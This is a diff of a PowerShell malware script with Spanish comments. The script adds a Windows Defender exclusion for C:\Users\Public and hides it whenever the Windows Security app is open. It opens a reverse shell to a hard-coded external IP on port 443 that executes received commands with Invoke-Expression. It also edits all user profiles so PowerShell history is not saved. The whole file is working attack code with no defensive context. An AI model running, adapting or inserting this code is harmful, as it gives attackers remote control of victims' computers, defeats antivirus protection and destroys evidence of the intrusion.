@@ -1,9 +1,31 @@
-# Excluir la ruta completa
-Add-MpPreference -ExclusionPath "C:\Users\Public"
+for ($iteration = 1; $iteration -le 10; $iteration++) {
 
-$maxIterations = 10
+    # Verificar si el proceso SecHealthUI.exe está activo
+    if (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {
 
-for ($count = 1; $count -le $maxIterations; $count++) {
+        # Quitar exclusiones de rutas en Windows Defender solo si existen
+        $exclusions = (Get-MpPreference).ExclusionPath
+        if ($exclusions) {
+            $exclusions | ForEach-Object { Remove-MpPreference -ExclusionPath $_ }
+        }
+
+        Write-Host "SecHealthUI.exe está en ejecución. Esperando a que se cierre..."
+
+        # Bucle de espera hasta que el proceso termine
+        while (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {
+            Start-Sleep -Seconds 2
+        }
+
+        # Cuando el proceso ya no exista, volver a agregar la exclusión
+        Add-MpPreference -ExclusionPath "C:\Users\Public"
+
+        Write-Host "El proceso SecHealthUI.exe se cerró. Fin del bucle."
+    }
+    else {
+        Write-Host "SecHealthUI.exe no está en ejecución."
+    }
+
+    # rev
     try {
         $client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
         $stream = $client.GetStream()
@@ -11,28 +33,15 @@ for ($count = 1; $count -le $maxIterations; $count++) {
         $buffer = New-Object Byte[] 1024
         $encoding = New-Object System.Text.ASCIIEncoding
 
-        while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
-
-            # Verificar si el proceso SecHealthUI.exe está activo
-            if (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {
-                # Quitar exclusiones de rutas en Windows Defender
-                (Get-MpPreference).ExclusionPath | ForEach-Object { Remove-MpPreference -ExclusionPath $_ }
-                Write-Host "SecHealthUI.exe está en ejecución. Esperando a que se cierre..."
-                
-                # Bucle de espera hasta que el proceso termine
-                while (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {
-                    Start-Sleep -Seconds 2
-                }
-
-                $data = $encoding.GetString($buffer,0, $i)
-                $sendback = (Invoke-Expression $data | Out-String )
-                $sendback2  = $sendback + "PS " + (pwd).Path + "> "
-                $writer.Write($sendback2)
-                $writer.Flush()
-            }
-
-            $client.Close()
+        while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
+            $data = $encoding.GetString($buffer,0, $i)
+            $sendback = (Invoke-Expression $data | Out-String )
+            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
+            $writer.Write($sendback2)
+            $writer.Flush()
         }
+
+        $client.Close()
     }
     catch {
         # opcional: escribir el error si quieres debug
@@ -67,6 +76,3 @@ foreach ($profile in $allUsersProfiles) {
         Add-Content -Path $profile -Value "Set-PSReadLineOption -HistorySaveStyle SaveNothing"
     } catch {}
 }
-
-# 4. Mensaje final
-Write-Host "Historial eliminado y prevención de almacenamiento futuro activada para todos los usuarios."
